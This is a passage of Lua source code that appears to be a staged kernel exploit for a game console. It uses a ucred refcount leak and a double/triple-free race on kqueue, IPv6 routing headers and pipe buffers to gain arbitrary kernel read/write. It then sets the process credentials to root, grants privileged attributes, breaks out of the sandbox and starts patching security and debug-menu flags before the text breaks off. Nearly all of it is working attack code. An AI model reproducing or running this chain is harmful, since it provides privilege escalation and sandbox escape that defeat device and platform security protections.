        local ret = to_num(syscall.setrlimit(RLIMIT_KQUEUES, rlp))
        klog("[0] setrlimit(RLIMIT_KQUEUES, inf) ret=" .. tostring(ret))
        return ret == 0
    end

    local function leak_tail(start_calls, start_time)
        local calls = start_calls
        local prev_ref = cr_ref_estimate(calls)
        local round = 0

        while calls < TARGET_CALLS do
            local todo = TARGET_CALLS - calls
            local batch = todo < TAIL_BATCH and todo or TAIL_BATCH

            for _ = 1, batch do
                syscall.kqueueex(BAD_KQUEUEEX_NAME)
            end

            calls = calls + batch
            round = round + 1

            local ref = cr_ref_estimate(calls)
            assert_no_unexpected_wrap("[0] leak-tail", prev_ref, ref)
            prev_ref = ref

            if round % 25 == 0 or calls == TARGET_CALLS then
                local elapsed = os.time() - start_time
                if elapsed < 1 then elapsed = 1 end
                local rate = calls / elapsed
                local eta = rate > 0 and ((TARGET_CALLS - calls) / rate) or 0
                klog(string.format("[0] leak-tail round=%d calls=%d cr_ref_est=%s rate=%.2f/s %s",
                    round, calls, fmt_u32(ref), rate, format_eta(eta)))
            end

            syscall.sched_yield()
        end
        return calls
    end

    local function leak_cr_ref_to_target()
        local stop_addr = malloc(8)
        local counter_addr = malloc(8)
        write64(stop_addr, 0)
        write64(counter_addr, 0)

        local fast_stop = TARGET_CALLS - LEAK_TAIL_SLACK
        local start_time = os.time()
        local prev_ref = cr_ref_estimate(0)

        local leak_threads = {}
        for i = 1, LEAK_WORKERS do
            leak_threads[i] = spawn_kqueueex_leaker(i, stop_addr, counter_addr)
        end

        klog("[0] leak-workers started workers=" .. tostring(LEAK_WORKERS)
            .. " worker_rt=" .. tostring(LEAK_WORKER_RTPRIO)
            .. " batch=" .. tostring(LEAK_BATCH)
            .. " fast_stop=" .. tostring(fast_stop)
            .. " tail_slack=" .. tostring(LEAK_TAIL_SLACK))

        while true do
            sleep(LEAK_LOG_INTERVAL, "s")
            local calls = to_num(read64(counter_addr))
            if calls > TARGET_CALLS then
                write64(stop_addr, 1)
                error("[0] leak-workers overshot target calls=" .. tostring(calls))
            end

            local ref = cr_ref_estimate(calls)
            assert_no_unexpected_wrap("[0] leak-workers", prev_ref, ref)
            prev_ref = ref

            local elapsed = os.time() - start_time
            if elapsed < 1 then elapsed = 1 end
            local rate = calls / elapsed
            local eta = rate > 0 and ((TARGET_CALLS - calls) / rate) or 0

            klog(string.format("[0] leak-workers calls=%d cr_ref_est=%s rate=%.2f/s %s",
                calls, fmt_u32(ref), rate, format_eta(eta)))

            if calls >= fast_stop then break end
        end

        write64(stop_addr, 1)
        for i = 1, #leak_threads do
            leak_threads[i]:join()
        end

        local calls = to_num(read64(counter_addr))
        if calls > TARGET_CALLS then
            error("[0] leak-workers post-stop overshot target calls=" .. tostring(calls))
        end

        klog("[0] leak-workers stopped calls=" .. tostring(calls)
            .. " cr_ref_est=" .. fmt_u32(cr_ref_estimate(calls)))

        calls = leak_tail(calls, start_time)
        if calls ~= TARGET_CALLS or cr_ref_estimate(calls) ~= TARGET_BEFORE_OPEN then
            error("[0] leak target mismatch calls=" .. tostring(calls)
                .. " cr_ref_est=" .. fmt_u32(cr_ref_estimate(calls)))
        end

        klog("[0] leak done cr_ref_est=" .. fmt_u32(cr_ref_estimate(calls)))
    end

    local function open_held_ucred_refs()
        local ref = TARGET_BEFORE_OPEN
        local wraps = 0
        for i = 1, UAF_FILE_COUNT do
            local fd = to_num(syscall.open(HELD_FILE_PATH, O_RDONLY, 0))
            if fd < 0 then
                error("[0] failed to open held file " .. tostring(i))
            end
            held_fds[i] = fd

            local next_ref = u32(ref + 1)
            if next_ref < ref then wraps = wraps + 1 end
            ref = next_ref
        end

        if ref ~= TARGET_AFTER_OPEN or wraps ~= 1 then
            error("[0] held fd accounting mismatch after_open=" .. fmt_u32(ref)
                .. " wraps=" .. tostring(wraps))
        end

        klog("[0] opened " .. tostring(UAF_FILE_COUNT)
            .. " held file refs (" .. HELD_FILE_PATH .. ") cr_ref_est=" .. fmt_u32(ref)
            .. " open_wraps=" .. tostring(wraps))
    end

    local function prime_fake_ucred_with_iov(rounds)
        for _ = 1, rounds do
            signal_iov()
            syscall.sched_yield()
            syscall.sched_yield()
            syscall.write(iov_sock_b, scratch_big, 1)
            wait_iov()
            syscall.read(iov_sock_a, dummy_byte, 1)
        end
    end

    local function reset_rthdr_spray()
        for i = 1, ipv6_count do
            free_rthdr(ipv6_sockets[i])
        end
    end

    local function find_twins_with_held_fds()
        local tried = 0
        for idx = 1, #held_fds do
            local fd = held_fds[idx]
            if fd and fd >= 0 then
                reset_rthdr_spray()
                prime_fake_ucred_with_iov(RECLAIM_CYCLES_BEFORE_CLOSE)

                local ret = to_num(syscall.close(fd))
                held_fds[idx] = -1
                tried = tried + 1
                klog("[0] close(" .. tostring(fd) .. ") double-free trigger idx="
                    .. tostring(idx) .. " attempt=" .. tostring(tried)
                    .. "/" .. tostring(#held_fds)
                    .. " ret=" .. tostring(ret))

                local twins = find_twins(TWIN_ROUNDS_PER_FD, "fd_idx=" .. tostring(idx))
                if twins then
                    klog("[0] twins " .. tostring(twins[1]) .. "," .. tostring(twins[2])
                        .. " from held_fd_idx=" .. tostring(idx))
                    return twins
                end

                klog("[0] no twins after held_fd_idx=" .. tostring(idx)
                    .. " rounds=" .. tostring(TWIN_ROUNDS_PER_FD))
                syscall.sched_yield()
            end
        end
        klog("[0] twin search exhausted held fds")
        return nil
    end

    local function close_next_held_fd_for_triplet()
        for idx = 1, #held_fds do
            local fd = held_fds[idx]
            if fd and fd >= 0 then
                local ret = to_num(syscall.close(fd))
                held_fds[idx] = -1
                klog("[0] close(" .. tostring(fd) .. ") triple-free trigger idx="
                    .. tostring(idx) .. " ret=" .. tostring(ret))
                return true
            end
        end
        return false
    end

    local function set_twin_refcnt_back_to_one(twins)
        free_rthdr(ipv6_sockets[twins[2] + 1])
        syscall.sched_yield(); syscall.sched_yield()

        local verify_buf = malloc(UCRED_SIZE)
        local verify_len = malloc(4)

        for round = 1, MAX_ROUNDS_TRIPLET do
            signal_iov()
            syscall.sched_yield(); syscall.sched_yield()

            write32(verify_len, 8)
            syscall.getsockopt(ipv6_sockets[twins[1] + 1], IPPROTO_IPV6, 51, verify_buf, verify_len)
            if read32(verify_buf) == 1 then
                klog("[0] fake ucred cr_ref restored to 1 round=" .. tostring(round))
                return true
            end

            syscall.write(iov_sock_b, scratch_big, 1)
            wait_iov()
            syscall.read(iov_sock_a, dummy_byte, 1)
        end

        return false
    end

    klog("[0] plan fds=" .. tostring(UAF_FILE_COUNT)
        .. " target_before_open=" .. fmt_u32(TARGET_BEFORE_OPEN)
        .. " target_after_open=" .. fmt_u32(TARGET_AFTER_OPEN)
        .. " open_wraps=1 target_calls=" .. tostring(TARGET_CALLS)
        .. " twin_rounds_per_fd=" .. tostring(TWIN_ROUNDS_PER_FD)
        .. " held_path=" .. HELD_FILE_PATH)

    local write_ok, write_err = pcall(file_write, failcheck_path, "")
    if not write_ok then
        elog("failcheck write failed: " .. tostring(write_err))
    end

    if not disable_kqueue_limit() then
        elog("[0] failed to disable RLIMIT_KQUEUES; continuing")
    end

    local detach_ret = to_num(syscall.setuid(1))
    klog("[0] setuid(1) detach ret=" .. tostring(detach_ret))
    if detach_ret ~= 0 then
        error("[0] failed to detach ucred before leak")
    end

    leak_cr_ref_to_target()
    open_held_ucred_refs()

    local trigger_ret = to_num(syscall.setuid(1))
    klog("[0] setuid(1) trigger ret=" .. tostring(trigger_ret) .. " old_cr_ref_est=0")
    if trigger_ret ~= 0 then
        error("[0] setuid trigger failed; refusing to close stale held fds")
    end

    for attempt = 1, TRIPLEFREE_ATTEMPTS do
        klog("[0] triplet attempt=" .. tostring(attempt))

        local twins = find_twins_with_held_fds()
        if not twins then break end

        if set_twin_refcnt_back_to_one(twins) then
            triplets[1] = twins[1]

            if close_next_held_fd_for_triplet() then
                syscall.sched_yield()

                triplets[2] = find_triplet(triplets[1], -1, MAX_ROUNDS_TRIPLET)
                if triplets[2] ~= -1 then
                    syscall.write(iov_sock_b, scratch_big, 1)
                    triplets[3] = find_triplet(triplets[1], triplets[2], MAX_ROUNDS_TRIPLET)
                    wait_iov(); syscall.read(iov_sock_a, dummy_byte, 1)

                    if triplets[3] ~= -1 then
                        race_success = true
                        klog("[0] triplets " .. triplets[1] .. "," .. triplets[2] .. "," .. triplets[3])
                        break
                    end
                end
            end
        end

        syscall.nanosleep(DELAY_SHORT, 0)
    end

    if not race_success then error("[0] triplet failed"); return nil end
    syscall.nanosleep(DELAY_MEDIUM, 0)

    -- -------------------------------------------------------------------------
    -- Stage 1: Kqueue Reclaim
    -- -------------------------------------------------------------------------
    stage_notify("Stage 1\nKqueue reclaim")
    
    free_rthdr(ipv6_sockets[triplets[2] + 1])
    syscall.sched_yield(); syscall.sched_yield()

    local proc_filedesc = 0
    local kq_found = false
    local kq_batch = {}

    for _ = 1, 5000 do
        local kq = to_num(syscall.kqueue())
        if kq < 0 then
            for _, fd in ipairs(kq_batch) do syscall.close(fd) end
            kq_batch = {}; syscall.sched_yield()
        else
            kq_batch[#kq_batch + 1] = kq
            write32(len_out, 256)
            get_rthdr(ipv6_sockets[triplets[1] + 1], rthdr_readback, len_out)

            if read32(rthdr_readback + 8) == 0x1430000 and read64(rthdr_readback + OFF.KQ_FDP) ~= 0 then
                kq_found = true
                for _, fd in ipairs(kq_batch) do if fd ~= kq then syscall.close(fd) end end
                proc_filedesc = read64(rthdr_readback + OFF.KQ_FDP)
                syscall.close(kq)
                break
            end

            if #kq_batch >= 8 then
                for _, fd in ipairs(kq_batch) do syscall.close(fd) end
                kq_batch = {}; syscall.sched_yield()
            end
        end
    end

    if not kq_found then
        for _, fd in ipairs(kq_batch) do syscall.close(fd) end
        error("[1] kqueue reclaim failed"); return nil
    end

    if not is_kptr(proc_filedesc) then error("[1] bad filedesc pointer"); return nil end
    klog("[1] proc_filedesc=" .. to_hex(proc_filedesc))

    for _ = 1, 3 do
        triplets[2] = find_triplet(triplets[1], triplets[3], 50000)
        if triplets[2] ~= -1 then break end
        syscall.sched_yield(); syscall.nanosleep(DELAY_SHORT, 0)
    end
    if triplets[2] == -1 then error("[1] triplet repair failed"); return nil end

    -- -------------------------------------------------------------------------
    -- Stage 2: Leak Pipe Data Pointers
    -- -------------------------------------------------------------------------
    stage_notify("Stage 2\nLeak pipe data pointers")
    klog("[2] leaking pipe pointers...")

    local fd_ofiles
    local master_fp, victim_fp
    local master_pipe_data, victim_pipe_data
    local stage2_ok = false

    for attempt = 1, 5 do
        repair_triplets(); syscall.nanosleep(DELAY_SETTLE, 0)

        -- struct filedesc -> fd_files is at offset 0; OFF.FILEDESC_OFILES is fdescenttbl->fdt_ofiles.
        local fdescenttbl = kslow64(proc_filedesc)
        if fdescenttbl then
            fd_ofiles = fdescenttbl + OFF.FDESCENTTBL_HDR
            repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

            master_fp = kslow64(fd_ofiles + master_rfd * OFF.FILEDESCENT_SIZE)
            if master_fp then
                repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

                victim_fp = kslow64(fd_ofiles + victim_rfd * OFF.FILEDESCENT_SIZE)
                if victim_fp then
                    repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

                    master_pipe_data = kslow64(master_fp)
                    if master_pipe_data then
                        repair_triplets(); syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()

                        victim_pipe_data = kslow64(victim_fp)
                        if victim_pipe_data and master_pipe_data ~= victim_pipe_data then
                            stage2_ok = true
                        end
                    end
                end
            end
        end
        if stage2_ok then break end
        syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()
    end

    if not stage2_ok then error("[2] failed"); return nil end
    klog("[2] master_pipe=" .. to_hex(master_pipe_data) .. " victim_pipe=" .. to_hex(victim_pipe_data))

    -- -------------------------------------------------------------------------
    -- Stage 3: Pipe Corruption -> Fast Kernel R/W
    -- -------------------------------------------------------------------------
    stage_notify("Stage 3\nPipe corruption -> fast kernel r/w")
    klog("[3] corrupting pipe buffer...")

    local pipe_overwrite = malloc(24)
    write32(pipe_overwrite,      0)              -- cnt
    write32(pipe_overwrite + 4,  0)              -- in
    write32(pipe_overwrite + 8,  0)              -- out
    write32(pipe_overwrite + 12, PAGE_SIZE)      -- size
    write64(pipe_overwrite + 16, victim_pipe_data)  -- buffer -> victim pipe

    syscall.nanosleep(DELAY_SETTLE, 0)

    local corrupt_ok = false
    for attempt = 1, 3 do
        repair_triplets()
        if kwrite_slow(master_pipe_data, pipe_overwrite, 24) then corrupt_ok = true; break end
        syscall.nanosleep(DELAY_SETTLE, 0); syscall.sched_yield()
    end
    if not corrupt_ok then error("[3] kwrite_slow failed"); return nil end
    syscall.sched_yield()

    -- pipe-based fast kernel r/w primitives
    local pipe_cmd_buf = malloc(24)

    local function set_victim_pipe(cnt, inp, out, size, buf_addr)
        write32(pipe_cmd_buf,      cnt)
        write32(pipe_cmd_buf + 4,  inp)
        write32(pipe_cmd_buf + 8,  out)
        write32(pipe_cmd_buf + 12, size)
        write64(pipe_cmd_buf + 16, buf_addr)
        syscall.write(master_wfd, pipe_cmd_buf, 24)
        return syscall.read(master_rfd, pipe_cmd_buf, 24)
    end

    local function kread(buf, kaddr, size)
        set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr)
        return syscall.read(victim_rfd, buf, size)
    end

    local function kwrite(kaddr, buf, size)
        set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr)
        return syscall.write(victim_wfd, buf, size)
    end

    local function kread32(kaddr) kread(scratch_big, kaddr, 4); return read32(scratch_big) end
    local function kread64(kaddr) kread(scratch_big, kaddr, 8); return read64(scratch_big) end
    local function kwrite32(kaddr, val) write32(scratch_big, val); kwrite(kaddr, scratch_big, 4) end
    local function kwrite64(kaddr, val) write64(scratch_big, val); kwrite(kaddr, scratch_big, 8) end

    -- verify corruption
    local verify_ok = false
    for attempt = 1, 3 do
        if kread64(master_pipe_data + 0x10) == victim_pipe_data then verify_ok = true; break end
        syscall.nanosleep(DELAY_SETTLE, 0); repair_triplets()
        kwrite_slow(master_pipe_data, pipe_overwrite, 24)
    end
    if not verify_ok then error("[3] verify failed"); return nil end
    klog("[3] kernel r/w achieved")

    -- -------------------------------------------------------------------------
    -- Stage 3b: Race Cleanup
    -- -------------------------------------------------------------------------

    local function get_file_ptr(fd)
        return kread64(fd_ofiles + fd * OFF.FILEDESCENT_SIZE)
    end

    local function bump_refcount(fp, delta)
        local rc = kread32(fp + 0x28)
        if rc > 0 and rc < 0x10000 then
            kwrite32(fp + 0x28, rc + delta)
            return true
        end
        return false
    end

    local function null_socket_rthdr(fd)
        local fp = kread64(fd_ofiles + fd * OFF.FILEDESCENT_SIZE)
        if not is_kptr(fp) then return end
        local f_data = kread64(fp)
        if not is_kptr(f_data) then return end
        local so_pcb = kread64(f_data + 0x18)
        if not is_kptr(so_pcb) then return end
        local pktopts = kread64(so_pcb + OFF.INPCB_PKTOPTS)
        if not is_kptr(pktopts) then return end
        kwrite64(pktopts + OFF.IP6PO_RTHDR, 0)
    end

    local master_rfp = get_file_ptr(master_rfd)
    local master_wfp = get_file_ptr(master_wfd)
    local victim_rfp = get_file_ptr(victim_rfd)
    local victim_wfp = get_file_ptr(victim_wfd)

    for _, fp_info in ipairs({
        {master_rfp, "master_r"}, {master_wfp, "master_w"},
        {victim_rfp, "victim_r"}, {victim_wfp, "victim_w"},
    }) do
        local fp, label = fp_info[1], fp_info[2]
        if not is_kptr(fp) then
            error("[3b] bad fp " .. label); return nil
        end
        bump_refcount(fp, 0x100)
    end

    for i = 1, ipv6_count do
        null_socket_rthdr(ipv6_sockets[i])
    end

    local function close_fd_once(fd, label)
        if not fd or fd < 0 then return false end
        local ret = to_num(syscall.close(fd))
        klog("[3b] close " .. tostring(label or "fd")
            .. " fd=" .. tostring(fd) .. " ret=" .. tostring(ret))
        return ret == 0
    end

    -- Never zero fde_file/fd_ofiles entries directly here.
    -- That leaves the filedesc bitmaps/counters/caps inconsistent and can panic
    -- later when the host process exits?  Close the descriptors normally so the
    -- kernel drains the fd-table bookkeeping exactly like luac0re does.
    if uaf_socket >= 0 then
        local uaf_fp = get_file_ptr(uaf_socket)
        if is_kptr(uaf_fp) then
            bump_refcount(uaf_fp, 0x100)
        end
        close_fd_once(uaf_socket, "uaf_socket")
        uaf_socket = -1
    end

    -- Close leftover held /dev/null fds.  The ones already consumed by the
    -- double/triple-free path are marked -1; the remaining fds still need a
    -- real close so process teardown does not see stale logical entries.
    local held_closed = 0
    for idx, fd in ipairs(held_fds) do
        if fd and fd >= 0 then
            close_fd_once(fd, "held[" .. tostring(idx) .. "]")
            held_fds[idx] = -1
            held_closed = held_closed + 1
        end
    end
    klog("[3b] closed remaining held fds=" .. tostring(held_closed))

    -- close ipv6 sockets after their rthdr pointers have been nulled
    for i = 1, ipv6_count do
        if ipv6_sockets[i] and ipv6_sockets[i] >= 0 then
            close_fd_once(ipv6_sockets[i], "ipv6[" .. tostring(i) .. "]")
            ipv6_sockets[i] = -1
        end
    end

    -- close worker socketpairs
    syscall.close(iov_sock_a); syscall.close(iov_sock_b)
    syscall.close(uio_sock_a); syscall.close(uio_sock_b)

    -- release worker threads
    signal_workers(iov_workers)
    signal_workers(uio_read_workers)
    signal_workers(uio_write_workers)
    syscall.sched_yield(); syscall.sched_yield()

    -- restore normal cpu scheduling
    for i = 0, 15 do write8(cpu_mask + i, 0xFF) end
    syscall.cpuset_setaffinity(3, 1, U64_NEG1, 16, cpu_mask)
    write16(rt_params, 0); write16(rt_params + 2, 0)
    syscall.rtprio_thread(1, 0, rt_params)

    klog("[3b] race cleanup done")
    sleep(3)

    -- -------------------------------------------------------------------------
    -- Stage 4: Find curproc via ioctl FIOSETOWN + sigio
    -- -------------------------------------------------------------------------
    stage_notify("Stage 4\nFind curproc via ioctl FIOSETOWN + sigio")
    local sigio_rfd, sigio_wfd = create_pipe_pair()
    local our_pid = to_num(syscall.getpid())
    local pid_buf = malloc(4); write32(pid_buf, our_pid)
    syscall.ioctl(sigio_rfd, 0x8004667C, pid_buf)

    local sigio_fp = get_file_ptr(sigio_rfd)
    if not is_kptr(sigio_fp) then error("[4] bad sigio fp"); return nil end

    local sigio_pipe = kread64(sigio_fp)
    if not is_kptr(sigio_pipe) then error("[4] bad sigio pipe"); return nil end

    local pipe_sigio = kread64(sigio_pipe + OFF.PIPE_SIGIO)
    if not is_kptr(pipe_sigio) then error("[4] no sigio"); return nil end

    local curproc = kread64(pipe_sigio)
    if not is_kptr(curproc) then error("[4] bad curproc"); return nil end

    local verify_pid = kread32(curproc + OFF.PROC_PID)
    if verify_pid ~= our_pid then error("[4] pid mismatch"); return nil end

    syscall.close(sigio_rfd); syscall.close(sigio_wfd)

    local proc_ucred = kread64(curproc + OFF.PROC_UCRED)
    local proc_fd    = kread64(curproc + OFF.PROC_FD)
    klog("[4] curproc=" .. to_hex(curproc) .. " fd=" .. to_hex(proc_fd))

    -- find rootvnode from init (pid 1)
    local rootvnode = nil
    local init_proc = nil

    local function find_init(start_proc, link_offset)
        local p = start_proc
        for _ = 1, 500 do
            if not is_kptr(p) then return nil end
            if kread32(p + OFF.PROC_PID) == 1 then return p end
            p = kread64(p + link_offset)
        end
        return nil
    end

    init_proc = find_init(curproc, 0x00) or find_init(kread64(curproc + 0x08), 0x08)

    if init_proc then
        local init_fd = kread64(init_proc + OFF.PROC_FD)
        if is_kptr(init_fd) then
            rootvnode = kread64(init_fd + OFF.FD_RDIR)
        end
    end

    if not is_kptr(rootvnode) then
        error("[4] rootvnode not found"); return nil
    end
    klog("[4] rootvnode=" .. to_hex(rootvnode))

    -- -------------------------------------------------------------------------
    -- Stage 5: Jailbreak
    -- -------------------------------------------------------------------------
    stage_notify("Stage 5\nJailbreak")
    -- patch uid/gid to root
    kwrite32(proc_ucred + OFF.UCRED_CR_UID,     0)
    kwrite32(proc_ucred + OFF.UCRED_CR_RUID,    0)
    kwrite32(proc_ucred + OFF.UCRED_CR_SVUID,   0)
    kwrite32(proc_ucred + OFF.UCRED_CR_NGROUPS, 1)
    kwrite32(proc_ucred + OFF.UCRED_CR_RGID,    0)

    -- set sceSceAttr to privileged
    local attrs_qword = kread64(proc_ucred + 0x80)
    attrs_qword = bit64.bor(bit64.band(attrs_qword, uint64("0xffffffff00ffffff")), 0x80000000)
    kwrite64(proc_ucred + 0x80, attrs_qword)

    -- escape sandbox
    kwrite64(proc_fd + OFF.FD_RDIR, rootvnode)
    kwrite64(proc_fd + OFF.FD_JDIR, rootvnode)
    
    local verify_uid = kread32(proc_ucred + OFF.UCRED_CR_UID)
    if verify_uid == 0 then
        klog("[5] jailbreak ok")
    else
        error("[5] jailbreak verify failed uid=" .. verify_uid)
    end

    -- Export kernel primitives as globals
    _G.kread    = kread
    _G.kwrite   = kwrite
    _G.kread32  = kread32
    _G.kread64  = kread64
    _G.kwrite32 = kwrite32
    _G.kwrite64 = kwrite64
    _G.curproc  = curproc
    _G.klog     = klog
    _G.ulog     = klog
    _G.OFF      = OFF
    _G.LIBKERNEL_HANDLE = LIBKERNEL_HANDLE
    _G.EBOOT_BASE = rawget(_G, "EBOOT_BASE") or rawget(_G, "eboot_base")

    if type(kernel) == "table" then
        kernel.addr = kernel.addr or {}
        kernel.addr.curproc = curproc
        kernel.addr.curproc_fd = proc_fd
        kernel.addr.curproc_ofiles = fd_ofiles

        kernel.copyout = function(kaddr, uaddr, size)
            kread(uaddr, kaddr, size)
        end

        kernel.copyin = function(uaddr, kaddr, size)
            kwrite(kaddr, uaddr, size)
        end

        kernel.read_buffer = function(kaddr, size)
            local buf = malloc(size)
            kread(buf, kaddr, size)
            return memory.read_buffer(buf, size)
        end

        kernel.write_buffer = function(kaddr, data)
            local buf = malloc(#data)
            memory.write_buffer(buf, data)
            kwrite(kaddr, buf, #data)
        end

        kernel.rw_initialized = true
    end

    local function stage_to_num(v)
        if type(v) == "table" and v.tonumber then return v:tonumber() end
        return tonumber(v)
    end

    local function stage_hex(v)
        if type(to_hex) == "function" then return to_hex(v) end
        if type(hex) == "function" then return hex(v) end
        if type(v) == "number" then return string.format("0x%x", v) end
        return tostring(v)
    end

    local function stage_warn(stage, s)
        elog("[" .. tostring(stage) .. "] " .. tostring(s))
    end


    local function ensure_kernel_offset_for_post()
        if type(kernel_offset) ~= "table" and type(get_kernel_offset) == "function" then
            local ok, ko = pcall(get_kernel_offset)
            if ok and type(ko) == "table" then
                kernel_offset = ko
                klog("[post] kernel_offset loaded for fw=" .. tostring(FW_VERSION))
            else
                stage_warn("post", "get_kernel_offset failed: " .. tostring(ko))
            end
        end
        return type(kernel_offset) == "table"
    end

    local function kr8(kaddr)
        if type(kernel) == "table" and type(kernel.read_byte) == "function" then
            local v = kernel.read_byte(kaddr)
            return stage_to_num(v)
        end
        return read8(kaddr)
    end

    local function kr32(kaddr)
        if type(kernel) == "table" and type(kernel.read_dword) == "function" then
            local v = kernel.read_dword(kaddr)
            return stage_to_num(v)
        end
        return kread32(kaddr)
    end

    local function kr64(kaddr)
        if type(kernel) == "table" and type(kernel.read_qword) == "function" then
            return kernel.read_qword(kaddr)
        end
        return kread64(kaddr)
    end

    local function kw8(kaddr, value)
        if type(kernel) == "table" and type(kernel.write_byte) == "function" then
            return kernel.write_byte(kaddr, value)
        end
        local b = malloc(1); write8(b, value); return kwrite(kaddr, b, 1)
    end

    local function kw32(kaddr, value)
        if type(kernel) == "table" and type(kernel.write_dword) == "function" then
            return kernel.write_dword(kaddr, value)
        end
        return kwrite32(kaddr, value)
    end

    local function kw64(kaddr, value)
        if type(kernel) == "table" and type(kernel.write_qword) == "function" then
            return kernel.write_qword(kaddr, value)
        end
        return kwrite64(kaddr, value)
    end

    local function find_allproc_for_post()
        if type(kernel) == "table" and kernel.addr and is_kptr(kernel.addr.allproc) then
            return kernel.addr.allproc
        end
        if is_kptr(rawget(_G, "allproc")) then
            kernel.addr.allproc = rawget(_G, "allproc")
            return kernel.addr.allproc
        end
        if not ensure_kernel_offset_for_post() or not kernel_offset.DATA_BASE_ALLPROC then return nil end

        -- Lapse allproc method: walk p_list.le_prev from curproc until
        -- the address layout matches data_base + DATA_BASE_ALLPROC.
        local p = curproc
        local mask = uint64("0xffff804000000000")
        for _ = 1, 128 do
            if not is_kptr(p) then break end
            if bit64.band(p, mask) == mask then
                local data_base = p - kernel_offset.DATA_BASE_ALLPROC
                if data_base and data_base.l and bit32.band(data_base.l, 0xfff) == 0 then
                    kernel.addr.allproc = p
                    _G.allproc = p
                    return p
                end
            end
            p = kr64(p + 0x08)
        end
        return nil
    end

    local function prepare_kernel_addr_for_stage6()
        if type(kernel) ~= "table" then return false, "kernel table missing" end
        kernel.addr = kernel.addr or {}
        kernel.addr.curproc = kernel.addr.curproc or curproc
        kernel.addr.curproc_fd = kernel.addr.curproc_fd or proc_fd
        kernel.addr.curproc_ofiles = kernel.addr.curproc_ofiles or fd_ofiles

        if not ensure_kernel_offset_for_post() then return false, "kernel_offset missing" end

        local ap = find_allproc_for_post()
        if ap then
            klog("[5] allproc=" .. stage_hex(ap))
        else
            stage_warn(5, "allproc not resolved; data_base may stay missing")
        end

        if ap and kernel_offset.DATA_BASE_ALLPROC and not kernel.addr.data_base then
            kernel.addr.data_base = ap - kernel_offset.DATA_BASE_ALLPROC
            klog("[5] data_base=" .. stage_hex(kernel.addr.data_base))
        elseif kernel.addr.data_base then
            klog("[5] data_base=" .. stage_hex(kernel.addr.data_base))
        end

        if type(update_kernel_offsets) == "function" then
            local ok, err = pcall(update_kernel_offsets)
            if ok then
                klog("[5] update_kernel_offsets ok")
            else
                stage_warn(5, "update_kernel_offsets failed: " .. tostring(err))
            end
        end

        if not kernel.addr.curproc_cr3 and type(get_proc_cr3) == "function" then
            local ok, cr3 = pcall(get_proc_cr3, curproc)
            if ok and cr3 then
                kernel.addr.curproc_cr3 = cr3
                klog("[5] curproc_cr3=" .. stage_hex(cr3))
            else
                stage_warn(5, "get_proc_cr3(curproc) failed: " .. tostring(cr3))
            end
        end

        if kernel.addr.data_base and kernel_offset.DATA_BASE_KERNEL_PMAP_STORE then
            local kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE
            kernel.addr.kernel_pmap_store = kernel_pmap_store
            klog("[5] kernel_pmap_store=" .. stage_hex(kernel_pmap_store))

            if not kernel.addr.kernel_cr3 and kernel_offset.PMAP_CR3 then
                local ok, cr3 = pcall(kr64, kernel_pmap_store + kernel_offset.PMAP_CR3)
                if ok and cr3 and cr3 ~= 0 then
                    kernel.addr.kernel_cr3 = cr3
                    klog("[5] kernel_cr3=" .. stage_hex(cr3))
                else
                    stage_warn(5, "kernel_cr3 read failed")
                end
            elseif kernel.addr.kernel_cr3 then
                klog("[5] kernel_cr3=" .. stage_hex(kernel.addr.kernel_cr3))
            end

            -- Lapse method: dmap_base = pml4 - cr3.
            if not kernel.addr.dmap_base then
                local ok_pml4, pml4 = pcall(kr64, kernel_pmap_store + 0x20)
                local ok_cr3, cr3_for_dmap = pcall(kr64, kernel_pmap_store + 0x28)
                if ok_pml4 and ok_cr3 and pml4 and cr3_for_dmap and pml4 ~= 0 and cr3_for_dmap ~= 0 then
                    kernel.addr.dmap_base = pml4 - cr3_for_dmap
                    if not kernel.addr.kernel_cr3 then kernel.addr.kernel_cr3 = cr3_for_dmap end
                    klog("[5] dmap_base=" .. stage_hex(kernel.addr.dmap_base)
                        .. " pml4=" .. stage_hex(pml4)
                        .. " cr3=" .. stage_hex(cr3_for_dmap))
                elseif kernel_offset.PMAP_STORE_DMPML4I and kernel_offset.PMAP_STORE_DMPDPI then
                    local ok1, dmpml4i = pcall(kr32, kernel_pmap_store + kernel_offset.PMAP_STORE_DMPML4I)
                    local ok2, dmpdpi  = pcall(kr32, kernel_pmap_store + kernel_offset.PMAP_STORE_DMPDPI)
                    if ok1 and ok2 and dmpml4i and dmpdpi then
                        dmpml4i = bit32.band(dmpml4i, 0x1ff)
                        dmpdpi  = bit32.band(dmpdpi,  0x1ff)
                        local dmap_base = bit64.bor(bit64.lshift(dmpml4i, 39), bit64.lshift(dmpdpi, 30))
                        if bit32.band(dmpml4i, 0x100) ~= 0 then
                            dmap_base = bit64.bor(dmap_base, uint64("0xffff000000000000"))
                        end
                        kernel.addr.dmap_base = dmap_base
                        klog("[5] dmap_base=" .. stage_hex(dmap_base))
                    else
                        stage_warn(5, "dmap_base read failed")
                    end
                else
                    stage_warn(5, "dmap_base read failed: no pml4/cr3 and no PMAP_STORE_DMP* offsets")
                end
            else
                klog("[5] dmap_base=" .. stage_hex(kernel.addr.dmap_base))
            end
        end

        if not kernel.addr.data_base then return false, "kernel.addr.data_base missing" end
        if not kernel.addr.kernel_cr3 then return false, "kernel.addr.kernel_cr3 missing" end
        if not kernel.addr.dmap_base then return false, "kernel.addr.dmap_base missing" end
        return true
    end

    local function apply_debug_menu_patches(accessor, label)
        if type(accessor) ~= "table" then return false, label .. " accessor missing" end
        if type(accessor.read_dword) ~= "function" or type(accessor.write_dword) ~= "function" then
            return false, label .. " dword read/write unavailable"
        end
        if type(accessor.read_byte) ~= "function" or type(accessor.write_byte) ~= "function" then
            return false, label .. " byte read/write unavailable"
        end
        if not kernel.addr.data_base then return false, "kernel.addr.data_base missing" end
        if not kernel_offset.DATA_BASE_SECURITY_FLAGS then return false, "DATA_BASE_SECURITY_FLAGS missing" end
        if not kernel_offset.DATA_BASE_TARGET_ID then return false, "DATA_BASE_TARGET_ID missing" end
        if not kernel_offset.DATA_BASE_QA_FLAGS then return false, "DATA_BASE_QA_FLAGS missing" end
